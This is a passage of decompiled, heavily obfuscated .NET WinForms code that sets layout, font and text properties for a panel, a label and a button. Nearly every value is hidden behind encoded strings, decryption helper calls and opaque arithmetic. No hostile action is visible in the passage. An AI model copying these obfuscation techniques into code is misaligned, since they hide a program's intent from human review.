		int num136 = ((Array)(object)"\u036b\u036c\u0318\u0306\u032f\u0314\u0305\u033a").Length;
		int fromBase4 = num136;
		((Control)obj14).set_BackColor(Color.FromArgb(red3, 39, Convert.ToInt32(value5, fromBase4)));
		((Control)panel_0).get_Controls().Add((Control)(object)TryRunSingle);
		((Control)panel_0).set_ForeColor(SystemColors.ActiveCaptionText);
		Panel obj15 = panel_0;
		int x3 = checked(685359 - ((-519246 ^ array2[162]) | 0x870D8));
		string string_99 = char.ToString('\ueed2') + "\ueed2\ueed2";
		object[] array101 = new object[(nint)((Array)(object)(char.ToString('\u0316') + char.ToString('\u0331') + "\u0346\u031a")).LongLength];
		array101[array2[163] - 853854] = Convert.ToInt32(char.ToString('1') + "d52", Convert.ToInt32("10000", 2));
		array101[sizeof(bool)] = char.ToString('テ') + char.ToString((char)Convert.ToInt32("100010111000010", 2)) + "ڲƪ";
		array101[Convert.ToInt32("2", 8)] = array[88] * 1;
		array101[3] = (byte)get_PositiveInfinity != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_99, array101);
		string text71 = string_99;
		string string_100 = string.Concat(char.ToString('蛅'), char.ToString('蛅') + char.ToString('蛅') + "蛅蛅");
		object[] array102 = new object[2];
		array102[(uint)array[2]] = string.Concat(char.ToString('搧'), char.ToString('\u0324') + "#D.\u0003\u0005");
		array102[Convert.ToInt32("1", Convert.ToInt32("2", 16))] = _003CModule_003E.ActivityOptions[32];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_100, array102);
		((Control)obj15).set_Location(new Point(x3, Convert.ToInt32(text71 + string_100, array6[15])));
		Panel obj16 = panel_0;
		string string_101 = "䕍䕜";
		object[] array103 = new object[Convert.ToInt32("4", sizeof(decimal))];
		array103[array2[164] ^ 0x282CE] = 37673;
		array103[array2[sizeof(ushort)]] = char.ToString('ȿ') + char.ToString('ᚥ') + "ɲᐢ";
		array103[_003CModule_003E.ActivityOptions[0]] = "\u0884Ə";
		array103[3] = ~Convert.ToInt32("11111111111111111101101001110010", 2);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_101, array103);
		string text72 = string_101;
		string text73 = char.ToString((char)(_003CModule_003E.get_PositiveSign[159] << 1));
		string string_102 = char.ToString('狞') + "狗犉";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_102, new object[3]
		{
			'⌋',
			(char)(106 * array[63]),
			~Convert.ToInt32("11111111111111110110011100110011", 2)
		});
		string string_103 = string.Concat(text72, text73 + string_102);
		object[] array104 = new object[5];
		char c36 = (char)Convert.ToInt32("0", 2);
		array104[0] = (byte)array4[(uint)c36] != 0;
		array104[1960273857 / ~_003CModule_003E.KeyValuePair__2[37]] = ((Convert.ToInt32("20" + "1743", 8) < 4635185 >> endAction) ? get_Instance : _003CModule_003E.KeyValuePair__2[38]) << checked(Convert.ToInt32("1", 16) * 1);
		string string_104 = "狲";
		object[] array105 = new object[sizeof(short)];
		int num137 = ((6263 == PulseAll) ? (-945526) : 0);
		array105[num137] = '㬸';
		int num138;
		string text74;
		string text75;
		string text76;
		string string_105;
		object[] array106;
		checked
		{
			array105[get_CurrencyGroupSeparator] = _003CModule_003E.ActivityOptions[142] * 8;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_104, array105);
			num138 = Convert.ToInt32(string_104, Subtract);
			text74 = char.ToString('\u033c');
			text75 = char.ToString('\u1de7');
			text76 = char.ToString('ഌ');
			string_105 = "쨢쒦";
			array106 = new object[411048 - Convert.ToInt32("645a5", 16)];
		}
		array106[0] = (char)array2[34];
		array106[1] = (char)(array2[165] + 380262);
		array106[~Convert.ToInt32("fffffffd", 16)] = '\u1082';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_105, array106);
		array104[num138] = string.Concat(text74, text75, text76 + string_105);
		int num139 = -1429730 - Convert.ToInt32("1111111" + "111111001" + "0110011101101100", 2);
		int num140 = ((array2[35] < 346581) ? Convert.ToInt32("fff" + "0c7b1", array2[7]) : 347462);
		array104[num139 ^ num140] = 21711;
		string string_106 = string.Concat(char.ToString('ﴽ'), char.ToString('ﴹ') + "ﴼﴸ﴿ﴽ");
		object[] array107 = new object[3];
		array107[array2[(uint)array[3]]] = false;
		array107[array2[Marshal.SizeOf(typeof(ENODATA))]] = TotalMinutes;
		array107[2] = (char)_003CModule_003E.get_PositiveSign[45];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_106, array107);
		int num143 = default(int);
		switch (Convert.ToInt32(string_106, Marshal.SizeOf(typeof(__c__DisplayClass0_6))) + Convert.ToInt32("fff" + "f2ee9", sizeof(decimal)) / checked(733913 + _003CModule_003E.KeyValuePair__2[162]))
		{
		case 0:
			checked
			{
				num143 = -367883 - unchecked(IsReadOnlyAttribute - array2[166]);
				break;
			}
		case 1:
			num143 = -568304;
			break;
		case 2:
			checked
			{
				int num141 = 384217 - AltDirectorySeparatorChar;
				int num142 = default(int);
				switch (-611258 + array2[167])
				{
				case 0:
					num142 = 573320;
					break;
				case 1:
					num142 = -941810;
					break;
				case 2:
					num142 = 0;
					break;
				case 3:
					num142 = Convert.ToInt32("11010001101010000111", 2);
					break;
				}
				num143 = num141 | num142;
				break;
			}
		}
		array104[num143] = ((Convert.ToInt32(char.ToString('f') + char.ToString('f') + "ff642d", array2[7]) <= -513494) ? (_003CModule_003E.get_PositiveSign[160] % -1984780) : Convert.ToInt32("ff" + "fffe45", 16)) * (150612 - Marshal.SizeOf(typeof(KeyData)) % 301236);
		_003CModule_003E.GetMaxByteCount(ref string_103, array104);
		((Control)obj16).set_Name(string_103);
		Panel obj17 = panel_0;
		int width3 = array6[7];
		string string_107 = "㷑㷖";
		object[] array108 = new object[sizeof(int)];
		array108[array2[1] * -830644] = (char)Convert.ToInt32(char.ToString('3') + "6af", 16);
		array108[Convert.ToInt32("1", 8)] = 453;
		array108[2] = -886488 + Marshal.SizeOf(typeof(get_Justification));
		array108[array2[168] - -179846] = _003CModule_003E.get_PositiveSign[46];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_107, array108);
		string value6 = string_107;
		char c37 = (char)sizeof(decimal);
		((Control)obj17).set_Size(new Size(width3, Convert.ToInt32(value6, c37)));
		Panel obj18 = panel_0;
		string string_108 = string.Concat(char.ToString((char)array2[169]), char.ToString('\u033e'), "ͺ\u0341" + "\u0313\u0347\u0361\u0336");
		object[] array109 = new object[3];
		array109[0] = string.Concat(char.ToString('\u0015'), char.ToString('\0'), char.ToString('\u0002') + "\u0001\0\u0001\u0002");
		array109[1] = '\u0014';
		array109[Convert.ToInt32("2", sizeof(decimal))] = (byte)array[sizeof(char)] != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_108, array109);
		((Control)obj18).set_TabIndex(array6[(nint)((Array)(object)string_108).LongLength]);
		Label r_OK = R_OK;
		char c38 = array[2];
		char num144 = c38;
		string string_109 = string.Concat("\uea3f\uea3f", char.ToString(array[89]), char.ToString('\uea3e') + char.ToString('\uea3e') + "\uea3e\uea3e\uea3e\uea3e\uea3e");
		object[] array110 = new object[Convert.ToInt32("3", 8) << (int)array[3]];
		array110[Convert.ToInt32("0", 16)] = 1058;
		array110[1] = 11810;
		array110[Convert.ToInt32("37777704040", 8) + 30690] = 'ࡐ';
		array110[3] = 40964;
		array110[4] = (char)checked(1979 * Stream);
		array110[array2[6]] = (byte)Convert.ToInt32("0", 8) != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_109, array110);
		int autoSize = default(int);
		switch ((int)num144 / Convert.ToInt32(string_109, Convert.ToInt32("2", 16)))
		{
		case 0:
			autoSize = 1;
			break;
		}
		((Control)r_OK).set_AutoSize((byte)autoSize != 0);
		Label r_OK2 = R_OK;
		string string_110 = "娡娗";
		object[] array111 = new object[Convert.ToInt32("f845", 16) >> 14];
		array111[0 << (int)array[54]] = 16272;
		array111[1] = false;
		int num145 = Marshal.SizeOf(typeof(ENODATA));
		int num146 = ((Convert.ToInt32("37777620145", 8) <= 295673) ? Convert.ToInt32("127626", 8) : (-779117));
		array111[num145] = num146;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_110, array111);
		string text77 = string_110;
		string text78 = char.ToString((char)NotApplicable);
		string string_111 = string.Concat(char.ToString((char)array2[170]), char.ToString('\uf0e4'), char.ToString('\uf0a1') + "\uf0d4\uf0c8");
		object[] array112 = new object[(uint)array[1] << sizeof(byte)];
		array112[get_PositiveInfinity] = 'ų';
		array112[checked(Convert.ToInt32("84bf1", 16) - 543728)] = (char)array2[36];
		array112[2] = Convert.ToInt32("432", 8) | Convert.ToInt32("1a2", 16);
		array112[3] = ProcessingMode - -706913;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_111, array112);
		string string_112 = string.Concat(text77, text78 + string_111);
		int num147 = ((Convert.ToInt32(char.ToString('6') + "350", 16) == Convert.ToInt32(char.ToString('6') + "1520", 8)) ? array2[0] : (Convert.ToInt32("37772257625", 8) - -538395));
		object[] array113 = new object[num147];
		char num148 = array4[~(_003CModule_003E.ActivityOptions[143] + _003CModule_003E.KeyValuePair__2[163])];
		int num149 = ((((45251 > Marshal.SizeOf(typeof(ConvertTimeToUtc))) ? 1 : 0) != array2[1]) ? Convert.ToInt32(char.ToString('2') + char.ToString('7') + "906", 16) : Marshal.SizeOf(typeof(Undefined)));
		string text79 = char.ToString((char)num149);
		string text80 = char.ToString('Ù');
		string string_113 = char.ToString('᥄') + "\u09caǯ";
		object[] array114 = new object[5];
		array114[0] = string.Concat(char.ToString('\r'), char.ToString('\r'), char.ToString('\u0002') + char.ToString('\0') + "\0\0\u0002");
		array114[1] = array2[171];
		array114[2] = false;
		array114[Convert.ToInt32("3", 16)] = ConstructionException & array2[172];
		array114[sizeof(float)] = Marshal.SizeOf(typeof(ContextCallback)) / 7015154;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_113, array114);
		array113[(uint)num148] = string.Concat(text79, text80 + string_113);
		int num151;
		int num152;
		checked
		{
			int num150 = default(int);
			switch (unchecked(Convert.ToInt32("1444405", 8) + Convert.ToInt32("37775051050", 8)) - -353491)
			{
			case 0:
				num150 = Marshal.SizeOf(typeof(UnobservedTaskException));
				break;
			case 1:
				num150 = 215364;
				break;
			}
			num151 = num150;
			num152 = ((((array2[173] > 500778) ? 1 : 0) != get_PositiveInfinity) ? 55022 : 341650);
		}
		array113[1] = num151 % (num152 % (0x217DD & _003CModule_003E.ActivityOptions[145]));
		_003CModule_003E.GetMaxByteCount(ref string_112, array113);
		string text81 = string_112;
		string string_114 = string.Concat(char.ToString('℩') + "℩℩", char.ToString('℩') + "℩℩", "℩℩℩℩℩℩℩" + "℩℩℩℩℩℩℩℩℩℩℩℩℩℩℩℩℩℩℩");
		object[] array115 = new object[Convert.ToInt32("11111111111111111011101101101100", 2) - -17560];
		array115[Convert.ToInt32("0", 8)] = 0x481 | Convert.ToInt32("4d0", 16);
		array115[FlattenHierarchy % 2] = 0x1FF & Convert.ToInt32("110011110", 2);
		array115[Convert.ToInt32("2", dwCookie)] = 0x1D & array[56];
		array115[endAction] = Marshal.SizeOf(typeof(GetMethodToken)) | array[90];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_114, array115);
		int num153 = default(int);
		switch (checked(-2 * Convert.ToInt32(string_114, unchecked(get_IsMemberRef % 4))))
		{
		case 0:
		{
			int num155 = ((_003CModule_003E.KeyValuePair__2[39] >= TickCount) ? 215450 : (array[91] * -478));
			num153 = num155;
			break;
		}
		case 1:
		{
			int num154 = ((81300 >= UseSpacesInMonthNames - -17113) ? (Marshal.SizeOf(typeof(get_Utf16SequenceLength)) << 1) : _003CModule_003E.get_PositiveSign[47]);
			num153 = num154;
			break;
		}
		case 2:
		{
			string string_115 = "ⅰ";
			object[] array116 = new object[checked(get_IsImport - 704407)];
			array116[0] = (int)array[35];
			array116[1] = 'Ͱ';
			array116[Stream] = (char)Never;
			array116[Convert.ToInt32("3", Marshal.SizeOf(typeof(PrepareDelegate)))] = array2[13];
			array116[(_003CModule_003E.KeyValuePair__2[164] > 266996) ? ToUpperInvariantMode : sizeof(int)] = Marshal.SizeOf(typeof(Forced));
			_003CModule_003E.TAIWANLUNISOLAR(ref string_115, array116);
			num153 = Convert.ToInt32(string_115, (-58074 >= MethodImplAttributes) ? 8 : (-98359));
			break;
		}
		}
		int num156 = num153;
		int num157 = Marshal.SizeOf(typeof(GenerateGuidForType)) ^ -8085;
		string string_116 = string.Concat(char.ToString('밧') + "밣밣밣", char.ToString('밡') + "밢밦밤밥밡밦");
		object[] array117 = new object[4];
		array117[get_PositiveInfinity] = checked(Convert.ToInt32("26524", 8) * Marshal.SizeOf(typeof(UseHebrewParsing)));
		array117[1] = char.ToString('ȝ') + "ù«";
		array117[(nint)((Array)(object)"\u0307\u0337").LongLength] = (char)Convert.ToInt32("1110" + "01" + "110000010", Convert.ToInt32("2", 8));
		array117[TargetPlatformAttribute / 317821010] = 6013;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_116, array117);
		((Control)r_OK2).set_Font(new Font(text81, 8f, (FontStyle)num156, (GraphicsUnit)checked(num157 - Convert.ToInt32(string_116, array[unchecked((nint)((Array)(object)"\u0335\u0304\u0325\u036f\u0357\u035a\u0337\u0347").LongLength)])), (byte)(~(212849 - -774 * array2[174]))));
		((Control)R_OK).set_ForeColor(SystemColors.Control);
		Label r_OK3 = R_OK;
		int num158 = ~_003CModule_003E.ActivityOptions[Convert.ToInt32("100010", 2)];
		string string_117 = "豟谆";
		object[] array118 = new object[(nint)((Array)(object)"\u036a\u0305\u033c\u034e\u035d\u0365\u033c\u033e\u033e\u0316\u032b\u032b\u0306\u035a..\u0339\u030f\u0363\u0300\u034d\u0318\u034d\u0345\u0308").LongLength % 10];
		array118[(nint)((Array)(object)string.Empty).LongLength] = string.Concat(char.ToString('ߵ'), char.ToString('㷝') + char.ToString('Y') + "\u001a\u0010\0\u0005");
		array118[1] = string.Concat(char.ToString('ג'), char.ToString('Ò') + char.ToString('Ė') + "KӀ2a");
		array118[2] = false;
		array118[3] = '\u1fcf';
		array118[Convert.ToInt32(char.ToString('1') + "00", 2)] = 6333;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_117, array118);
		((Control)r_OK3).set_Location(new Point(num158 % Convert.ToInt32(string_117, sizeof(Guid)), BinaryReader));
		Label r_OK4 = R_OK;
		string text82 = char.ToString((char)(404111 - T2));
		string text83 = char.ToString((char)checked(unchecked(448475 - op_UnaryNegation) - Convert.ToInt32(char.ToString('3') + char.ToString('1') + "03445", dwCookie)));
		string text84 = char.ToString('\u0b78');
		string string_118 = char.ToString('顱') + "顸頠";
		object[] array119 = new object[array2[4] & 3];
		array119[(-98958 > Convert.ToInt32("b05d2", 16)) ? (-838502) : 0] = false;
		array119[_003CModule_003E.ActivityOptions[2]] = 7671;
		array119[(-78735 >= Convert.ToInt32("37775626665", 8)) ? 2 : 145501] = checked(array2[175] * _003CModule_003E.ActivityOptions[146]);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_118, array119);
		string string_119 = string.Concat(text82, text83, text84 + string_118);
		object[] array120 = new object[164974135 >> 49109800 / (15715141 >> (int)((Array)(object)"\u031e\u0364\u034d").LongLength)];
		nint num159 = (nint)((Array)(object)string.Empty).LongLength;
		int num160 = array[2];
		int num161 = (int)(num159 | num160);
		int num162 = array2[1];
		int num163 = default(int);
		switch (checked(array2[176] - -707272))
		{
		case 0:
			num163 = 205571;
			break;
		case 1:
			num163 = 468214;
			break;
		}
		int num164 = default(int);
		switch (num162 * num163)
		{
		case 0:
		{
			int num165 = default(int);
			switch (Convert.ToInt32("21030", 8))
			{
			case 8728:
				num165 = 67;
				break;
			}
			num164 = num165;
			break;
		}
		case 1:
			num164 = _003CModule_003E.get_PositiveSign[array2[15]];
			break;
		case 2:
			num164 = 72660;
			break;
		case 3:
			num164 = 566105;
			break;
		}
		int num166 = num164;
		int num167 = (('\u0001' != array[2]) ? (_003CModule_003E.get_PositiveSign[2] % 2) : 922510);
		array120[num161] = num166 * num167;
		int hasFlagsAttribute2 = HasFlagsAttribute;
		string string_120 = string.Concat(char.ToString('ɉ'), char.ToString('ɉ') + "ɌɎ");
		object[] array121 = new object[3];
		array121[(uint)array[2]] = 309;
		array121[1] = (byte)checked(-139197 - Convert.ToInt32("37777360103", 8)) != 0;
		array121[-497465 ^ _003CModule_003E.get_PositiveSign[162]] = 325;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_120, array121);
		array120[hasFlagsAttribute2] = Convert.ToInt32(string_120, dwCookie & 0xA) & _003CModule_003E.Dequeue[checked(ActivityTracker + TimeZoneToken)];
		array120[2] = (int)array4[7];
		int num168 = checked(ConcurrentCollection_SyncRoot_NotSupported + 882763);
		int num169 = ((((-198890 % AddMonths < -484352) ? 1 : 0) != Convert.ToInt32("0", 16)) ? 522186 : 818);
		string text85 = char.ToString((char)num169);
		string string_121 = "텔톁";
		object[] array122 = new object[(nint)((Array)(object)(char.ToString('\u035a') + "\u0312\u033e\u0325")).LongLength];
		array122[0] = Convert.ToInt32(char.ToString('1') + "010100011100", 2);
		array122[1] = 897;
		int num170 = Convert.ToInt32("2", 16);
		array122[num170] = Convert.ToInt32(char.ToString('7') + "1066", Marshal.SizeOf(typeof(__c__DisplayClass0_6)));
		array122[3] = (int)checked(18168 * unchecked((nint)((Array)(object)"\u033c").LongLength));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_121, array122);
		array120[num168] = text85 + string_121;
		_003CModule_003E.GetMaxByteCount(ref string_119, array120);
		((Control)r_OK4).set_Name(string_119);
		((Control)R_OK).set_Size(new Size(2423 >> 698695848 / checked(array2[177] - array2[178]), 1811330555 >> 1658771811 / _003CModule_003E.KeyValuePair__2[40]));
		Label r_OK5 = R_OK;
		int num171 = ((40162 >= _003CModule_003E.KeyValuePair__2[166]) ? array2[179] : 49);
		string text86 = char.ToString((char)num171);
		string text87 = char.ToString('0');
		string string_122 = "ꌜꌝ";
		object[] array123 = new object[array2[0]];
		array123[0] = string.Concat(char.ToString('⡲'), char.ToString('⠼') + char.ToString('ظ') + "²ى(");
		array123[(uint)array[Convert.ToInt32("3", 16)]] = 17699;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_122, array123);
		((Control)r_OK5).set_TabIndex(Convert.ToInt32(text86 + text87 + string_122, ~checked(3 * GetDllEntry)));
		Label r_OK6 = R_OK;
		string text88 = char.ToString((char)array2[37]);
		string text89 = char.ToString('\udde5');
		string string_123 = string.Concat(char.ToString('饆'), char.ToString(array[93]), char.ToString('饀') + "餒饶");
		object[] array124 = new object[1396096765 / array2[180]];
		array124[(uint)array[2]] = false;
		array124[1] = string.Concat(char.ToString('\u0003'), char.ToString('\0') + "\u0001\u0002\u0001\u0006");
		array124[(uint)array[1]] = array2[38];
		array124[_003CModule_003E.KeyValuePair__2[_003CModule_003E.ActivityOptions[1]]] = char.ToString('\u0006') + "\0\u0004";
		array124[4] = string.Concat("\u0003\u0001", char.ToString('\0') + char.ToString('\0') + "\0\0\u0002");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_123, array124);
		string text90 = text88 + text89 + string_123;
		string text91 = char.ToString((char)checked(Convert.ToInt32("35741", 16) - 162143));
		string text92 = char.ToString('\uddf8');
		string string_124 = string.Concat(char.ToString('䲲'), char.ToString('䲾') + char.ToString('䲣') + "䲵䳱");
		object[] array125 = new object[4];
		int num172 = array[2];
		array125[num172] = char.ToString('ᙵ') + "\v.";
		array125[array2[6] % 2] = char.ToString((char)array2[158]) + "ō\u00a0";
		array125[2] = (char)Marshal.SizeOf(typeof(IDLFLAG_FIN));
		array125[Convert.ToInt32("3", array2[7])] = 434129 - Convert.ToInt32("1100011110001010010", 2);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_124, array125);
		string text93 = text91 + text92 + string_124;
		string string_125 = "⣾⣙";
		object[] array126 = new object[3];
		int num173 = default(int);
		switch (-548982 - _003CModule_003E.get_PositiveSign[163])
		{
		case 0:
			num173 = 839653;
			break;
		case 1:
			num173 = _003CModule_003E.ActivityOptions[1];
			break;
		}
		array126[num173] = (char)((int)array[32] % 4412);
		string text94;
		string string_126;
		checked
		{
			array126[unchecked((nint)((Array)(object)".").LongLength) * 1] = 9696;
			array126[2] = string.Concat(char.ToString('Ꮟ'), char.ToString('▞'), char.ToString('藦') + char.ToString('\u0013') + "ҽǍÍ");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_125, array126);
			text94 = string_125;
			string_126 = "涩涯";
		}
		object[] array127 = new object[array2[181] - 108102];
		array127[0] = 43311;
		array127[array2[2]] = array2[(uint)array[80]];
		array127[Convert.ToInt32("0", 2) | 2] = Marshal.SizeOf(typeof(Custom));
		array127[Convert.ToInt32("3", 8)] = 'ɇ';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_126, array127);
		string text95 = string_126;
		string string_127 = string.Concat("件亹", char.ToString('仾') + char.ToString('仰') + "仿仭仺件份仼");
		object[] array128 = new object[4];
		int num174 = checked(0 * Convert.ToInt32("fff91874", 16));
		int num175 = default(int);
		switch (0 / Convert.ToInt32("1735", 8))
		{
		case 0:
			num175 = array[66];
			break;
		}
		array128[num174] = num175;
		array128[1] = Signature >> 1;
		array128[2] = 31854;
		array128[3 * (nint)((Array)(object)"\u0348").LongLength] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_127, array128);
		string string_128 = string.Concat(text90, text93, text94 + text95 + string_127);
		int num176 = ~Convert.ToInt32(char.ToString('f') + char.ToString('f') + "fffffa", Convert.ToInt32("20", 8));
		object[] array129 = new object[num176];
		IntPtr intPtr4 = (nint)((Array)(object)string.Empty).LongLength;
		string string_129 = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(Product))), char.ToString('塾') + "塺塺塸");
		object[] array130 = new object[(uint)array[7]];
		array130[324787 >> (int)((Array)(object)"\u033b\u0366\u0358\u0309\u036a\u0341\u0307\u0351\u032e\u0360\u0318.\u0344\u0348\u0338\u0349\u0338\u031a\u0342\u0318\u035c").LongLength] = 12020 % Convert.ToInt32("12c8", 16);
		array130[checked(Convert.ToInt32("3ab44", 16) - RequiresStringComparison)] = "੬ᚇ";
		array130[2] = string.Concat(char.ToString((char)array2[182]), char.ToString('\u035c') + char.ToString('v') + "\u001d\u0013");
		array130[endAction] = 6147;
		array130[4] = char.ToString('\u0347') + "\u0acbŞ";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_129, array130);
		string text96 = char.ToString((char)Convert.ToInt32(string_129, 8));
		string text97 = char.ToString((char)((uint)(7488925 >> Convert.ToInt32("3", 8)) ^ 0xE7D1Cu));
		string text98 = char.ToString((char)Sometimes);
		string string_130 = "䏝䶞";
		object[] array131 = new object[3];
		array131[_003CModule_003E.ActivityOptions[Convert.ToInt32("1", 8)]] = 7329;
		array131[_003CModule_003E.ActivityOptions[array2[0]]] = (char)(3215 % (int)array[94]);
		array131[(uint)array[1]] = "Όম";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_130, array131);
		array129[(nint)intPtr4] = string.Concat(text96, text97, text98 + string_130);
		string text99 = char.ToString('\b');
		string string_131 = "쮷쮍";
		object[] array132 = new object[(uint)array[sizeof(int)]];
		array132[get_PositiveInfinity] = (char)Convert.ToInt32(char.ToString('2') + char.ToString('3') + "666", 8);
		int num177 = array2[183];
		array132[1] = num177;
		array132[(nint)((Array)(object)"\u0357\u0369").LongLength] = 10102;
		array132[array2[4]] = array2[41];
		array132[4] = (char)Marshal.SizeOf(typeof(ICustomQueryInterface));
		int num178;
		checked
		{
			array132[Convert.ToInt32("1010010100101101010", 2) - 338277] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_131, array132);
			array129[1] = text99 + string_131;
			num178 = (Convert.ToInt32("11111111" + "111111111111111111111101", 2) * -1) & ActualValue;
		}
		string text100 = char.ToString((char)checked(-43 * Convert.ToInt32("37" + "77" + "7777777", 8)));
		int num179 = _003CModule_003E.ActivityOptions[14];
		string text101 = char.ToString((char)array6[num179]);
		string text102 = char.ToString((char)Marshal.SizeOf(typeof(CleanupCode)));
		string string_132 = string.Concat(char.ToString('曶'), char.ToString('曱') + "曰曳");
		object[] array133 = new object[_003CModule_003E.KeyValuePair__2[12] % 8];
		array133[Convert.ToInt32("111110110111000010", 2) ^ Convert.ToInt32("111110110111000010", 2)] = (byte)(0 << (int)((Array)(object)"..\u031d\u0359\u032c.").LongLength) != 0;
		array133[_003CModule_003E.ActivityOptions[2]] = char.ToString((char)_003CModule_003E.get_PositiveSign[164]) + "Ìȗ";
		array133[2] = "ᙺڞ";
		array133[(uint)array[5]] = "\u2e5d\u0730";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_132, array133);
		array129[num178] = string.Concat(text100, text101, text102 + string_132);
		int num180 = ~(checked(Convert.ToInt32("39038", 16) * array2[184]) | -136381100);
		string text103 = char.ToString((char)((checked(Title + 692853) < array2[185] << 1) ? (array2[186] / 7373249) : Free));
		string string_133 = "⨻⪔";
		object[] array134 = new object[array2[array2[4]]];
		array134[0] = Marshal.SizeOf(typeof(GetOffset));
		array134[583910 - Convert.ToInt32("2164345", 8)] = char.ToString(array[5]) + "\0\u0002";
		array134[10 % Marshal.SizeOf(typeof(IsValidText))] = string.Concat(char.ToString('\u008f'), char.ToString('ì') + char.ToString('\0') + "\u0001\u0002");
		array134[Convert.ToInt32("3", sizeof(double))] = char.ToString('ᝍ') + "դ\u0b81";
		array134[checked(-811959 + Convert.ToInt32("c63bb", 16))] = string.Concat(char.ToString((char)Convert.ToInt32("6b", 16)), char.ToString('\u0001') + " *\u001d");
		array134[FlattenHierarchy] = (byte)((Array)(object)string.Empty).Length != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_133, array134);
		array129[num180] = text103 + string_133;
		int num183;
		if (-79505 > ((-9929 / _003CModule_003E.ActivityOptions[2]) & -329409))
		{
			string string_134 = char.ToString('ᶦ') + "ᶢᶣ";
			object[] array135 = new object[array2[5]];
			int num181 = Convert.ToInt32("0", 2);
			int num182 = ((Convert.ToInt32("4bad", 16) < -178278) ? 471703 : 0);
			array135[num181] = (byte)num182 != 0;
			array135[1] = 1542;
			array135[2] = 2409;
			array135[3] = 'ศ';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_134, array135);
			num183 = Convert.ToInt32(string_134, 8);
		}
		else
		{
			num183 = checked(_003CModule_003E.get_PositiveSign[165] - 637740);
		}
		array129[4] = num183;
		_003CModule_003E.GetMaxByteCount(ref string_128, array129);
		((Control)r_OK6).set_Text(string_128);
		((Control)M21).set_BackColor(SystemColors.ButtonHighlight);
		Button m = M21;
		string string_135 = "욷";
		object[] array136 = new object[4];
		array136[0 | (nint)((Array)(object)string.Empty).LongLength] = (byte)(0 | (nint)((Array)(object)string.Empty).LongLength) != 0;
		array136[1] = 25328;
		array136[2] = string.Concat(char.ToString('ʬ'), char.ToString('\u0081') + "Ċɪ");
		array136[3] = 11899 * Convert.ToInt32("10", 2);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_135, array136);
		((ButtonBase)m).set_FlatStyle((FlatStyle)(Convert.ToInt32(string_135, 8) | 0));
		Button m2 = M21;
		int x4 = _003CModule_003E.LoadVector128[(uint)array4[17]];
		int num184 = _003CModule_003E.LoadVector128[Convert.ToInt32("30", 8)];
		string string_136 = string.Concat("☃☃" + "☂☃☂☂☃☃", char.ToString('☂') + "☂☃" + "☂☂☂☃☂☃☃☂");
		object[] array137 = new object[4];
		array137[0] = char.ToString('\u0087') + "-B";
		array137[111 >> (int)array[4]] = 'ĭ';
		array137[2] = 3156;
		array137[3] = 6075;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_136, array137);
		Button m3;
		string text104;
		checked
		{
			((Control)m2).set_Location(new Point(x4, num184 + Convert.ToInt32(string_136, 2)));
			m3 = M21;
			string string_137 = "騂騕";
			object[] array138 = new object[endAction];
			array138[0] = 442;
			array138[613613 >> Convert.ToInt32("13", 16)] = 79;
			array138[_003CModule_003E.ActivityOptions[147] - Convert.ToInt32("fffb0963", 16)] = string.Concat(char.ToString('\u0015'), char.ToString('"') + "\f\u0018");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_137, array138);
			text104 = string_137;
		}
		string text105 = char.ToString((char)(Convert.ToInt32("11111111111110011100000000001100", 2) + 448612));
		string string_138 = char.ToString((char)Convert.ToInt32("5507", 16)) + char.ToString('唜') + "唝啂";
		int num185 = ((Marshal.SizeOf(typeof(Mean)) >= 934091) ? (-50578) : 5);
		object[] array139 = new object[num185];
		array139[~Convert.ToInt32("11111111111111111111111111111111", 2)] = (char)Marshal.SizeOf(typeof(ILGenerator));
		array139[1] = 4240;
		array139[Convert.ToInt32("10", 2) | 0] = 'ᄔ';
		array139[checked(array2[187] + 669506)] = (byte)(-909911 + array2[188]) != 0;
		array139[(int)array[15] % 8] = Marshal.SizeOf(typeof(RaiseContractFailedEvent));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_138, array139);
		string string_139 = string.Concat(text104, text105 + string_138);
		int num186 = Convert.ToInt32("11111" + "11111" + "1111110111011001100101", 2) / 1;
		int num187 = _003CModule_003E.ActivityOptions[148];
		int num188 = ((((num187 < -378329) ? 1 : 0) != Convert.ToInt32("0", 2)) ? 95610 : 253638);
		object[] array140 = new object[(num186 > num188) ? ((98329 << (int)array[3]) + -998027) : ((Convert.ToInt32(char.ToString('6') + char.ToString('4') + "82", 16) <= -405922) ? (-575431) : Convert.ToInt32(char.ToString('1') + "00", 2))];
		int num189 = Convert.ToInt32("11111111111100010010110001110100", 2) + -279149 - -745806 / Convert.ToInt32("1", 2) + ((((Convert.ToInt32("30002", 8) != -22522) ? (-59160) : Convert.ToInt32("fff546b7", 16)) == -67790) ? array2[42] : 505003);
		int num190 = default(int);
